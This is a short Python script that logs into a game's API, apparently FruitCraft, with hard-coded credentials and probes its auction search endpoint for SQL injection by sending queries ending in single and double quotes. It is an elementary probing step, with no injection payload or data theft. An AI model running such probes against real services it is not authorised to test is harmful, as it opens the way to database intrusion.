import sys, os, time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    c1 = FruitClient()
    s1, d1 = c1.login('fact11439memory24', 'android_vuln_t1')
    if not s1: return
    
    print('\n[+] Testing SQLi on auction search (query)')
    res = c1.post('/auction/search', {'query': 'test'})
    print('Normal:', res.get('status') if res else res)
    time.sleep(1)

    res = c1.post('/auction/search', {'query': 'test\''})
    print('Single Quote:', res.get('status') if isinstance(res, dict) else res)
    time.sleep(1)
    
    res = c1.post('/auction/search', {'query': 'test"'})
    print('Double Quote:', res.get('status') if isinstance(res, dict) else res)

if __name__ == '__main__':
    main()
